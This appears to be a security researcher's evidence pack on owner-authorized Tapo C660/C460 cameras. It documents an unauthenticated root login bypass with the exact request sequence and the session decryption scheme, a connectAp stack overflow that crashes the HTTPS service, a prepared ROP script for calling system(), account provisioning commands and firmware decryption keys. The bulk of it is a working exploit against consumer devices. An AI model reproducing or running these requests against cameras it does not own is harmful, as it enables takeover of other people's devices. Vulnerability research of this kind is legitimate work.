# EV pack — H-012: Tapo C660/C460 (owner's `.4.70`/`.4.71`) unauthenticated admin and the connectAp overflow

Target: owned Tapo cameras, model family C660/C460 (owner-confirmed; exact unit↔model not read),
LAN `192.168.4.70` `192.168.4.71`, HTTPS 443 (local DS JSON API).
All traffic is owner-authorized LAN. No cloud account was used.

Primary artifacts (all created this session):

| Path | What |
|---|---|
| `~/fss-exploit/tapo/replay4.py` | minimal unauth admin bypass (empty-cnonce device_confirm replay) |
| `~/fss-exploit/tapo/api.py` | session client: `POST /stok=<stok>/ds`, `multipleRequest`, `seq`, AES-128-CBC response decrypt |
| `~/fss-exploit/tapo/pwn.py` | blind `connectAp` ROP sender (C320WS offsets, currently unverified on these models) |
| `~/fss-exploit/c660_fw.bin.dec`, `~/fss-exploit/c660_old.bin.dec` | decrypted C660 1.1.8 Build 260428 and 1.1.7 Build 251230 |
| `~/fss-exploit/tpd/bin/tp-link-decrypt` | upstream TP-Link OTA decryptor (robbins/tp-link-decrypt) built with the published DES key/IV and `RSA_0` from C210 `slpupgrade` |
| `~/fss-exploit/ee` | ee ledger (`mem_01M5JVNDDYETWSXC4RVVDEA1JT` and successors) |

---

## Bottom line

1. **The local API can be taken to `user_group: root` without a password.** The camera's own
   `device_confirm` is a valid proof when `cnonce` is empty, because the two SHA-256 orderings collide:
   `H(cnonce + H(pw) + acn) + acn + cnonce` (what the device returns) equals
   `H(H(pw) + cnonce + acn) + cnonce + acn` (what phase 2 expects) iff `cnonce == ""`.
2. **The `connectAp` onboarding path has a stack overflow in these models too.** A 3000-byte base64
   `password` returns an empty response and kills the HTTPS service — the same shared decode wrapper as
   CVE-2026-105810 (C320WS) and CVE-2026-15316 (C200 DoS). Offsets for C660/C460 are not yet derived.
3. **Firmware acquisition, decryption and signature verification work** for both models from public key
   lists; the remaining blocker is the proprietary `BCL1` app-initramfs codec that holds `/bin/main`.
4. Both units sleep hard (battery/solar). `.4.70` never returned after `soft_reset`; `.4.71` answers ICMP
   but its TLS listener stalls. The bypass was proven while they were awake.

---

## 1. Unauthenticated admin bypass (proven, `.4.70`, then `.70` link lost)

```
POST / {"method":"login","params":{"cnonce":"","encrypt_type":"3","username":"admin"}}
 -> result.data.device_confirm (dc), nonce
POST / {"method":"login","params":{"cnonce":"","encrypt_type":"3","digest_passwd":dc,"username":"admin"}}
 -> error_code 0, result.user_group = "root", result.stok, result.start_seq
```

Observed response (first run):

```
phase1 -40413 ['code','device_confirm','encrypt_type','key','max_time','nonce','time']
phase2 {"result":{"user_group":"root","stok":"5B65fysgKJxjdy7ZeCSv46OCK7CYEc35","start_seq":249},"error_code":0}
```

Session envelope (reverse-engineered by differential probing; not documented):

```
POST /stok=<stok>/ds
seq: <start_seq++, server returns its next seq>
{"method":"multipleRequest","params":{"requests":[<inner>]}}
```

* Responses are `{"seq":N,"result":{"response":"<b64>"}}`; decrypt with AES-128-CBC,
  `lsk = sha256("lsk"+nonce+hk)[:32]`, `ivb = sha256("ivb"+nonce+hk)[:32]`, `hk = dc[:64]` (hex).
* `tapo_tag` is not required by these units.
* `securePassthrough` is **not** the outer envelope here; the plain `multipleRequest` is.

Control proof: `setAccountEnabled` (`user_management.set_account_enabled`) returned `0`; `scanApList`
returned the real AP list including `Aardvark` and a device PEM `public_key`.

## 2. ONVIF / RTSP provisioning (done, `.4.70`)

```
setAccountEnabled {"user_management":{"set_account_enabled":{"enabled":"on"}}}         -> 0
changeThirdAccount {"user_management":{"change_third_account":{
  "username":"fssuser","passwd":MD5("Fss-Third-9x7").upper(),
  "ciphertext":base64(RSA_PKCS1(pubkey_from_scanApList,"Fss-Third-9x7")),"unique_key":0}}} -> 0
syncHubReset {"system":{"soft_reset":{}}}                                              -> 0
```

MD5 (not SHA-256) is the hashing function for this action. A reboot is required to start ONVIF.
`.4.70` went down at the reset and never came back to the LAN during this session.

## 3. connectAp overflow (present; offsets pending)

`connectAp` with `password` = base64 of 3000 random bytes and
`{"ssid":"poc","bssid":"00:11:22:33:44:55","auth":1,"encryption":3,"pwd_encrypted":true,"unique_key":"A"*16}`
returns an empty body and the next `GET /` is `000` for minutes: the HTTPS service crashed. Smaller
payloads (e.g. 1000 raw bytes) may survive; the exact threshold is not measured.

Public analogue: CVE-2026-105810 (C320WS V2) — saved PC at 0x424 in a 1024-byte decoded stack buffer,
no canary, non-PIE ARM, ROP to `system()`. `~/fss-exploit/tapo/pwn.py` encodes exactly that chain
(`pop {r3-r8,sl,fp,pc}`, `add r1,sp,#4; mov r0,sp; blx r3`, `system@plt`) and is ready to fire once a
unit is awake; failure mode is another HTTPS crash and restart.

## 4. Firmware pipeline (works)

* Public key list: `cavefire/tplink-firmware-directory` `all_keys.csv` contains
  `firmware/assigned/Tapo_C660_en_1.1.8_Build_260428_Rel.8467n_up_boot_2026-04-28_02.21.17_1777347622865.bin`
  and C460 1.2.3/1.2.2 keys. The TP-Link download page itself no longer links firmware.
* Decrypt: `tp-link-decrypt` with `DES_KEY 0001020304050607`, `DES_IV f51010736efbabb2`
  (both from `rtk-maple_gpl.tar.gz` `libservice.so.0.0.0` `des_key` symbol − 0x10000) and `RSA_0`
  (base64 `BgIAAAwk…` from C210 `slpupgrade`). Output: `Firmware verification successful`.
* Layout: 12-byte `BCL1` header + app initramfs (see §5) + servicefs squashfs (`lz4`) +
  kernel uImage (`Linux-5.10.168`, ARM, non-PIE load 0x800000) + DTBs.

## 5. Open blocker: `BCL1` codec

Header: `BCL1` + u32 BE uncompressed size (0x676800) + u32 BE compressed size (0x419caf); the compressed
size + 0x10 ends exactly at the servicefs squashfs in both 1.1.8 and 1.1.7 (padding FF in between).
First byte `0xde` is an LZO1X first-literal-run of 205 bytes; LZF (identical first run) decodes
6,776,828 of 6,776,832 bytes with any 64 KiB dictionary. Decoded output starts as cpio
(`070701` + ino + mode ASCII) then fields go binary; filenames (`root`, `var`, `/tmp`, `overlay`,
`is_battery_cam`) and a final `TRAILER!!!` in the stream are cpio-shaped. The dictionary is unknown and
is not in u-boot, LZO1Y/1Z/1B/1C/1F, LZ4/LZMA/zstd/bzip2/zlib. `/bin/main` is only in this blob.

## 6. Reproduction notes

* `.4.70`/`.4.71` are battery/solar units: ping is not liveness for the API. Wake them from the app or
  power-cycle; expect `000` on 443 while they wake.
* The `en1` interface changed source address mid-session (`192.168.4.170` → `.160/.169/.222`, /24);
  bind explicitly.
* `getDeviceInfo`/`getInfo` return success but empty subtrees on this firmware; method names resolve
  through `/etc/dsd_convert.json`, which is not readable without the app fs.
